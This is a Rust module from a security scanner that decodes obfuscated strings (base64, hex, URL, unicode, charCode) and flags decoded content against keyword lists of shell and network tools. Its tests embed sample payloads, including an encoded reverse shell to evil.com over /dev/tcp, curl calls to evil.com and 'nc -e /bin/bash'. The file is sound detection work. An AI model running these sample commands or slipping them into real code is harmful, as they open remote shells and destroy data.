use base64::Engine;
use regex::Regex;
use std::sync::LazyLock;

/// Deobfuscation engine for deep scanning
pub struct Deobfuscator;

static BASE64_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?")
        .expect("BASE64 regex")
});
static HEX_PATTERN: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?:\\x[0-9A-Fa-f]{2}){4,}|(?:0x[0-9A-Fa-f]{2}){4,}").expect("HEX regex")
});
static URL_ENCODED_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:%[0-9A-Fa-f]{2}){4,}").expect("URL encoded regex"));
static UNICODE_ESCAPE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:\\u[0-9A-Fa-f]{4}){2,}").expect("Unicode escape regex"));
static CHAR_CODE_PATTERN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"String\.fromCharCode\s*\([\d,\s]+\)").expect("CharCode regex"));

impl Deobfuscator {
    pub fn new() -> Self {
        Self
    }

    /// Deobfuscate content and return a list of decoded strings
    pub fn deobfuscate(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        // Try base64 decoding
        for decoded in self.decode_base64(content) {
            results.push(decoded);
        }

        // Try hex decoding
        for decoded in self.decode_hex(content) {
            results.push(decoded);
        }

        // Try URL decoding
        for decoded in self.decode_url(content) {
            results.push(decoded);
        }

        // Try unicode escape decoding
        for decoded in self.decode_unicode_escapes(content) {
            results.push(decoded);
        }

        // Try JavaScript charCode decoding
        for decoded in self.decode_char_code(content) {
            results.push(decoded);
        }

        results
    }

    /// Decode base64 encoded strings
    fn decode_base64(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in BASE64_PATTERN.find_iter(content) {
            let encoded = cap.as_str();
            // Skip if too short or looks like random text
            if encoded.len() < 20 {
                continue;
            }

            if let Ok(decoded_bytes) = base64::engine::general_purpose::STANDARD.decode(encoded)
                && let Ok(decoded_str) = String::from_utf8(decoded_bytes)
                && self.is_suspicious(&decoded_str)
            {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded: decoded_str,
                    encoding: "base64".to_string(),
                });
            }
        }

        results
    }

    /// Decode hex encoded strings (\\x or 0x format)
    fn decode_hex(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in HEX_PATTERN.find_iter(content) {
            let encoded = cap.as_str();

            // Extract hex bytes
            let hex_bytes: Vec<u8> = if encoded.starts_with("\\x") {
                encoded
                    .split("\\x")
                    .filter(|s| !s.is_empty())
                    .filter_map(|s| u8::from_str_radix(&s[..2.min(s.len())], 16).ok())
                    .collect()
            } else {
                // 0x format
                encoded
                    .split("0x")
                    .filter(|s| !s.is_empty())
                    .filter_map(|s| u8::from_str_radix(&s[..2.min(s.len())], 16).ok())
                    .collect()
            };

            if let Ok(decoded_str) = String::from_utf8(hex_bytes)
                && self.is_suspicious(&decoded_str)
            {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded: decoded_str,
                    encoding: "hex".to_string(),
                });
            }
        }

        results
    }

    /// Decode URL encoded strings
    fn decode_url(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in URL_ENCODED_PATTERN.find_iter(content) {
            let encoded = cap.as_str();

            // Manual URL decoding
            let mut decoded_bytes = Vec::new();
            let mut chars = encoded.chars().peekable();

            while let Some(c) = chars.next() {
                if c == '%' {
                    let hex: String = chars.by_ref().take(2).collect();
                    if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                        decoded_bytes.push(byte);
                    }
                } else {
                    decoded_bytes.push(c as u8);
                }
            }

            if let Ok(decoded_str) = String::from_utf8(decoded_bytes)
                && self.is_suspicious(&decoded_str)
            {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded: decoded_str,
                    encoding: "url".to_string(),
                });
            }
        }

        results
    }

    /// Decode unicode escape sequences (\\uXXXX)
    fn decode_unicode_escapes(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in UNICODE_ESCAPE_PATTERN.find_iter(content) {
            let encoded = cap.as_str();
            let mut decoded = String::new();

            let mut chars = encoded.chars().peekable();
            while let Some(c) = chars.next() {
                if c == '\\' && chars.peek() == Some(&'u') {
                    chars.next(); // consume 'u'
                    let hex: String = chars.by_ref().take(4).collect();
                    if let Ok(code_point) = u32::from_str_radix(&hex, 16)
                        && let Some(ch) = char::from_u32(code_point)
                    {
                        decoded.push(ch);
                    }
                } else {
                    decoded.push(c);
                }
            }

            if self.is_suspicious(&decoded) {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded,
                    encoding: "unicode".to_string(),
                });
            }
        }

        results
    }

    /// Decode JavaScript String.fromCharCode patterns
    fn decode_char_code(&self, content: &str) -> Vec<DecodedContent> {
        let mut results = Vec::new();

        for cap in CHAR_CODE_PATTERN.find_iter(content) {
            let encoded = cap.as_str();

            // Extract numbers from the pattern
            let numbers: Vec<u32> = encoded
                .split(|c: char| !c.is_ascii_digit())
                .filter(|s| !s.is_empty())
                .filter_map(|s| s.parse().ok())
                .collect();

            let decoded: String = numbers.iter().filter_map(|&n| char::from_u32(n)).collect();

            if self.is_suspicious(&decoded) {
                results.push(DecodedContent {
                    original: encoded.to_string(),
                    decoded,
                    encoding: "charcode".to_string(),
                });
            }
        }

        results
    }

    /// Check if decoded content looks suspicious
    fn is_suspicious(&self, content: &str) -> bool {
        let suspicious_patterns = [
            "eval",
            "exec",
            "bash",
            "sh -c",
            "/bin/",
            "curl ",
            "wget ",
            "nc ",
            "netcat",
            "/dev/tcp",
            "/dev/udp",
            "base64 -d",
            "python -c",
            "ruby -e",
            "perl -e",
            "powershell",
            "cmd.exe",
            "rm -rf",
            "chmod ",
            "sudo ",
            "password",
            "secret",
            "api_key",
            "token",
            "credential",
            "http://",
            "https://",
            "ftp://",
        ];

        let content_lower = content.to_lowercase();
        suspicious_patterns
            .iter()
            .any(|p| content_lower.contains(p))
    }

    /// Deep scan content - deobfuscate and return all findings
    pub fn deep_scan(&self, content: &str, file_path: &str) -> Vec<crate::rules::Finding> {
        use crate::scanner::ScannerConfig;

        let mut findings = Vec::new();
        let config = ScannerConfig::new();

        // First scan original content
        findings.extend(config.check_content(content, file_path));

        // Then scan decoded content
        for decoded in self.deobfuscate(content) {
            let context = format!("{}:decoded:{}", file_path, decoded.encoding);

            // Create findings for deobfuscated content
            for mut finding in config.check_content(&decoded.decoded, &context) {
                // Add note about deobfuscation
                finding.message = format!(
                    "{} [Decoded from {} encoded content]",
                    finding.message, decoded.encoding
                );
                findings.push(finding);
            }

            // Also check for suspicious decoded content itself
            if decoded.decoded.len() > 10 && self.is_highly_suspicious(&decoded.decoded) {
                findings.push(crate::rules::Finding {
                    id: "OB-DEEP-001".to_string(),
                    severity: crate::rules::Severity::High,
                    category: crate::rules::Category::Obfuscation,
                    confidence: crate::rules::Confidence::Firm,
                    name: "Obfuscated suspicious content".to_string(),
                    location: crate::rules::Location {
                        file: file_path.to_string(),
                        line: 0,
                        column: None,
                    },
                    code: decoded.original.chars().take(100).collect::<String>() + "...",
                    message: format!(
                        "Found {} encoded content that decodes to suspicious payload",
                        decoded.encoding
                    ),
                    recommendation: "Review the decoded content for malicious commands or URLs"
                        .to_string(),
                    fix_hint: None,
                    cwe_ids: vec!["CWE-116".to_string()],
                });
            }
        }

        findings
    }

    /// Check if content is highly suspicious (more specific than is_suspicious)
    fn is_highly_suspicious(&self, content: &str) -> bool {
        let highly_suspicious = [
            "bash -i",
            "/dev/tcp/",
            "nc -e",
            "rm -rf /",
            "curl | bash",
            "wget | sh",
            "eval(base64",
            "exec(decode",
        ];

        let content_lower = content.to_lowercase();
        highly_suspicious.iter().any(|p| content_lower.contains(p))
    }
}

impl Default for Deobfuscator {
    fn default() -> Self {
        Self::new()
    }
}

/// Represents decoded content from obfuscation
#[derive(Debug, Clone)]
pub struct DecodedContent {
    pub original: String,
    pub decoded: String,
    pub encoding: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_base64() {
        let deob = Deobfuscator::new();
        // "curl http://evil.com" in base64
        let content = "Y3VybCBodHRwOi8vZXZpbC5jb20=";
        let results = deob.decode_base64(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_decode_hex() {
        let deob = Deobfuscator::new();
        // "curl" in hex
        let content = r"\x63\x75\x72\x6c\x20\x68\x74\x74\x70";
        let results = deob.decode_hex(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_decode_url() {
        let deob = Deobfuscator::new();
        // "curl http" URL encoded
        let content = "%63%75%72%6c%20%68%74%74%70";
        let results = deob.decode_url(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_decode_charcode() {
        let deob = Deobfuscator::new();
        // String.fromCharCode for "eval"
        let content = "String.fromCharCode(101,118,97,108)";
        let results = deob.decode_char_code(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("eval"));
    }

    #[test]
    fn test_is_suspicious() {
        let deob = Deobfuscator::new();
        assert!(deob.is_suspicious("curl http://example.com"));
        assert!(deob.is_suspicious("bash -c 'evil command'"));
        assert!(deob.is_suspicious("password=secret123"));
        assert!(!deob.is_suspicious("hello world"));
    }

    #[test]
    fn test_deep_scan() {
        let deob = Deobfuscator::new();
        // Content with highly suspicious obfuscated payload: "bash -i >& /dev/tcp/x"
        // Base64 for "bash -i >& /dev/tcp/evil.com/1234"
        let content = "normal text\nYmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS8xMjM0 # hidden payload";
        let findings = deob.deep_scan(content, "test.sh");
        // Should find OB-DEEP-001 for highly suspicious decoded content
        assert!(
            findings
                .iter()
                .any(|f| f.id == "OB-DEEP-001" || f.message.contains("Decoded"))
        );
    }

    #[test]
    fn test_deobfuscate_empty() {
        let deob = Deobfuscator::new();
        let results = deob.deobfuscate("normal text without obfuscation");
        assert!(results.is_empty());
    }

    #[test]
    fn test_default_trait() {
        let deob = Deobfuscator;
        assert!(!deob.is_suspicious("hello"));
    }

    #[test]
    fn test_decode_unicode_escapes() {
        let deob = Deobfuscator::new();
        // "eval" in unicode escapes
        let content = r"\u0065\u0076\u0061\u006c";
        let results = deob.decode_unicode_escapes(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("eval"));
    }

    #[test]
    fn test_decode_base64_short_string() {
        let deob = Deobfuscator::new();
        // Short base64 string (less than 20 chars) should be skipped
        let content = "YWJjZA=="; // "abcd" in base64
        let results = deob.decode_base64(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_base64_non_suspicious() {
        let deob = Deobfuscator::new();
        // Long base64 but decodes to non-suspicious content
        let content = "dGhpcyBpcyBhIG5vcm1hbCBzYWZlIHRleHQ="; // "this is a normal safe text"
        let results = deob.decode_base64(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_hex_0x_format() {
        let deob = Deobfuscator::new();
        // "curl" in 0x format
        let content = "0x630x750x720x6c0x200x680x740x740x70";
        let results = deob.decode_hex(content);
        assert!(!results.is_empty());
        assert!(results[0].decoded.contains("curl"));
    }

    #[test]
    fn test_is_highly_suspicious() {
        let deob = Deobfuscator::new();
        assert!(deob.is_highly_suspicious("bash -i >& /dev/tcp/"));
        assert!(deob.is_highly_suspicious("rm -rf /"));
        assert!(deob.is_highly_suspicious("curl | bash something"));
        assert!(deob.is_highly_suspicious("wget | sh something"));
        assert!(deob.is_highly_suspicious("nc -e /bin/bash"));
        assert!(deob.is_highly_suspicious("eval(base64"));
        assert!(deob.is_highly_suspicious("exec(decode"));
        assert!(!deob.is_highly_suspicious("echo hello"));
    }

    #[test]
    fn test_deobfuscate_with_base64() {
        let deob = Deobfuscator::new();
        // Contains suspicious base64
        let content = "command=Y3VybCBodHRwOi8vZXZpbC5jb20="; // "curl http://evil.com"
        let results = deob.deobfuscate(content);
        assert!(!results.is_empty());
    }

    #[test]
    fn test_deobfuscate_multiple_encodings() {
        let deob = Deobfuscator::new();
        // Content with both hex and base64
        let content =
            r"data=Y3VybCBodHRwOi8vZXZpbC5jb20=; exec \x63\x75\x72\x6c\x20\x68\x74\x74\x70";
        let results = deob.deobfuscate(content);
        // Should find results from both decoders
        assert!(!results.is_empty());
    }

    #[test]
    fn test_deep_scan_clean_content() {
        let deob = Deobfuscator::new();
        let content = "normal clean content without any issues";
        let findings = deob.deep_scan(content, "test.txt");
        // Should have no findings for clean content
        assert!(findings.is_empty());
    }

    #[test]
    fn test_deep_scan_with_suspicious_decoded() {
        let deob = Deobfuscator::new();
        // Content with moderately suspicious base64 (triggers is_suspicious but not is_highly_suspicious)
        let content = "payload=Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vZG93bmxvYWQuc2g="; // "curl http://example.com/download.sh"
        let findings = deob.deep_scan(content, "test.sh");
        // May or may not have findings depending on scanner rules
        // Just verify no panic
        let _ = findings;
    }

    #[test]
    fn test_decoded_content_debug_trait() {
        let content = DecodedContent {
            original: "abc".to_string(),
            decoded: "xyz".to_string(),
            encoding: "base64".to_string(),
        };
        let debug_str = format!("{:?}", content);
        assert!(debug_str.contains("DecodedContent"));
        assert!(debug_str.contains("abc"));
    }

    #[test]
    fn test_decoded_content_clone_trait() {
        let content = DecodedContent {
            original: "abc".to_string(),
            decoded: "xyz".to_string(),
            encoding: "base64".to_string(),
        };
        let cloned = content.clone();
        assert_eq!(content.original, cloned.original);
        assert_eq!(content.decoded, cloned.decoded);
        assert_eq!(content.encoding, cloned.encoding);
    }

    #[test]
    fn test_is_suspicious_various_patterns() {
        let deob = Deobfuscator::new();
        assert!(deob.is_suspicious("wget http://evil.com"));
        assert!(deob.is_suspicious("nc -l 1234"));
        assert!(deob.is_suspicious("netcat connection"));
        assert!(deob.is_suspicious("/dev/tcp/evil"));
        assert!(deob.is_suspicious("/dev/udp/evil"));
        assert!(deob.is_suspicious("base64 -d | bash"));
        assert!(deob.is_suspicious("python -c 'import os'"));
        assert!(deob.is_suspicious("ruby -e 'exec'"));
        assert!(deob.is_suspicious("perl -e 'system'"));
        assert!(deob.is_suspicious("powershell.exe"));
        assert!(deob.is_suspicious("cmd.exe /c"));
        assert!(deob.is_suspicious("rm -rf /tmp"));
        assert!(deob.is_suspicious("chmod 777 file"));
        assert!(deob.is_suspicious("sudo rm"));
        assert!(deob.is_suspicious("api_key=secret"));
        assert!(deob.is_suspicious("token=abc123"));
        assert!(deob.is_suspicious("credential_store"));
        assert!(deob.is_suspicious("ftp://server"));
    }

    #[test]
    fn test_decode_url_non_suspicious() {
        let deob = Deobfuscator::new();
        // URL encoded "hello world" (non-suspicious)
        let content = "%68%65%6c%6c%6f%20%77%6f%72%6c%64";
        let results = deob.decode_url(content);
        // Should be empty because "hello world" is not suspicious
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_hex_non_suspicious() {
        let deob = Deobfuscator::new();
        // "hello" in hex - not suspicious
        let content = r"\x68\x65\x6c\x6c\x6f";
        let results = deob.decode_hex(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_charcode_non_suspicious() {
        let deob = Deobfuscator::new();
        // "hello" in charCode - not suspicious
        let content = "String.fromCharCode(104,101,108,108,111)";
        let results = deob.decode_char_code(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_decode_unicode_non_suspicious() {
        let deob = Deobfuscator::new();
        // "ab" in unicode - not suspicious
        let content = r"\u0061\u0062";
        let results = deob.decode_unicode_escapes(content);
        assert!(results.is_empty());
    }

    #[test]
    fn test_deep_scan_original_content_finding() {
        let deob = Deobfuscator::new();
        // Content that triggers a rule via check_content
        // Using sudo which should trigger PE-001
        let content = "sudo rm -rf /important/files";
        let findings = deob.deep_scan(content, "script.sh");
        // Should find findings for sudo usage
        assert!(!findings.is_empty());
    }
}
